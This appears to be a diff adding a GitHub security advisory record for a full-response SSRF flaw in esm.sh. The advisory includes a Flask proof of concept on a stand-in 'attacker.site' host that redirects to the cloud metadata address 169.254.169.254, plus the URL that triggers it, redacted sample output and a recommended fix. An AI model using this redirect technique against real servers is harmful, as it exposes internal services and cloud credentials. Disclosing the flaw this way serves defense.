@@ -1,0 +1,59 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-02-25T15:19:44Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/esm-dev/esm.sh"
+  },
+  "Advisory": {
+    "DatabaseId": 339209,
+    "Id": "GSA_kwCzR0hTQS0zYzlyLTgzN3ItcXFtNM4ABS0J",
+    "GhsaId": "GHSA-3c9r-837r-qqm4",
+    "References": [
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/security/advisories/GHSA-3c9r-837r-qqm4"
+      },
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/pull/1149"
+      },
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/commit/0593516c4cfab49ad3b4900416a8432ff2e23eb0"
+      },
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/releases/tag/v137"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-3c9r-837r-qqm4"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-3c9r-837r-qqm4"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-50180"
+      }
+    ],
+    "Description": "### Summary\n\nesh.sh is vulnerable to a full-response SSRF, allowing an attacker to retrieve information from internal websites through the vulnerability.\n\n### Details\n\nVulnerable code location: https://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/server/router.go#L511\n\nIf the internal address has a suffix listed below, the attacker can obtain content from the specified internal address.\n\neg: https://esm.sh/https://local.site/test.md\n\n```\n\".js\", \".ts\", \".mjs\", \".mts\", \".jsx\", \".tsx\", \".cjs\", \".cts\", \".vue\", \".svelte\", \".md\", \".css\"\n```\n\nA 302 redirect can be used to bypass the suffix restriction.\n\neg: https://esm.sh/https://attacker.site/test.md \n\nhttps://attacker.site/test.md 302 redirect to http://169.254.169.254/v1.json\n\n### PoC\n\nUse Flask to start a server that returns a 302 redirect.\n\n```python\nfrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/test.md')\ndef redirect_test():\n    return redirect(\"http://169.254.169.254/v1.json\", code=302)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n```\n\nLet esh.sh visit this site.\n\nhttps://esm.sh/https://attacker.site/test.md\n\nAttacker can obtain data from http://169.254.169.254/v1.json.\n\n```\nvar t=`\u003cp\u003e\u0026lbrace;\u0026quot;bgp\u0026quot;:\u0026lbrace;\u0026quot;ipv4\u0026quot;:\u0026lbrace;\u0026quot;my-address\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;my-asn\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;peer-address\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;peer-asn\u0026quot;:\u0026quot;\u0026quot;\u0026rbrace;,\u0026quot;ipv6\u0026quot;:\u0026lbrace;\u0026quot;my-address\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;my-asn\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;peer-address\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;peer-asn\u0026quot;:\u0026quot;\u0026quot;\u0026rbrace;\u0026rbrace;,\u0026quot;hostname\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;instance-v2-id\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;instanceid\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;interfaces\u0026quot;:[\u0026lbrace;\u0026quot;ipv4\u0026quot;:\u0026lbrace;\u0026quot;additional\u0026quot;:[],\u0026quot;address\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;gateway\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;netmask\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;routes\u0026quot;:[\u0026lbrace;\u0026quot;netmask\u0026quot;:32,\u0026quot;network\u0026quot;:\u0026quot;****\u0026quot;\u0026rbrace;]\u0026rbrace;,\u0026quot;ipv6\u0026quot;:\u0026lbrace;\u0026quot;additional\u0026quot;:[],\u0026quot;address\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;network\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;prefix\u0026quot;:\u0026quot;64\u0026quot;\u0026rbrace;,\u0026quot;mac\u0026quot;:\u0026quot;****\u0026quot;,\u0026quot;network-type\u0026quot;:\u0026quot;public\u0026quot;\u0026rbrace;],\u0026quot;nvidia-driver\u0026quot;:[],\u0026quot;public-keys\u0026quot;:[\u0026quot;****\u0026quot;],\u0026quot;region\u0026quot;:\u0026lbrace;\u0026quot;countrycode\u0026quot;:\u0026quot;US\u0026quot;,\u0026quot;regioncode\u0026quot;:\u0026quot;SJC\u0026quot;\u0026rbrace;,\u0026quot;tags\u0026quot;:[]\u0026rbrace;\u003c/p\u003e\n`,o={},u=t;export{u as default,t as html,o as meta};\n```\n\nDecode the data (redacted) .\n\n```json\n{\"bgp\":{\"ipv4\":{\"my-address\":\"\",\"my-asn\":\"\",\"peer-address\":\"\",\"peer-asn\":\"\"},\"ipv6\":{\"my-address\":\"\",\"my-asn\":\"\",\"peer-address\":\"\",\"peer-asn\":\"\"}},\"hostname\":\"****\",\"instance-v2-id\":\"****\",\"instanceid\":\"****\",\"interfaces\":[{\"ipv4\":{\"additional\":[],\"address\":\"****\",\"gateway\":\"****\",\"netmask\":\"****\",\"routes\":[{\"netmask\":32,\"network\":\"****\"}]},\"ipv6\":{\"additional\":[],\"address\":\"****\",\"network\":\"****\",\"prefix\":\"64\"},\"mac\":\"****\",\"network-type\":\"public\"}],\"nvidia-driver\":[],\"public-keys\":[\"****\"],\"region\":{\"countrycode\":\"US\",\"regioncode\":\"SJC\"},\"tags\":[]}\n```\n\n### Impact\n\nAn attacker can exploit the vulnerability to access internal sites, and in a cloud environment, can retrieve access keys (AK) and secret keys (SK) by accessing the metadata service address.\n\n### Fix\n\nIt is recommended to use `safeurl.Client` as a replacement for `http.Client`.\n\nhttps://github.com/esm-dev/esm.sh/blob/f80ff8c8d58749e77fa964abde468fc61f8bd89e/internal/fetch/fetch.go#L13\n\nhttps://github.com/doyensec/safeurl",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-25T15:19:41Z",
+    "Severity": "HIGH",
+    "Summary": "esm.sh is vulnerable to full-response SSRF",
+    "UpdatedAt": "2026-02-25T15:19:44Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.0-20250616164159-0593516c4cfa"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.0-20250616164159-0593516c4cfa"
+    }
+  ]
+}
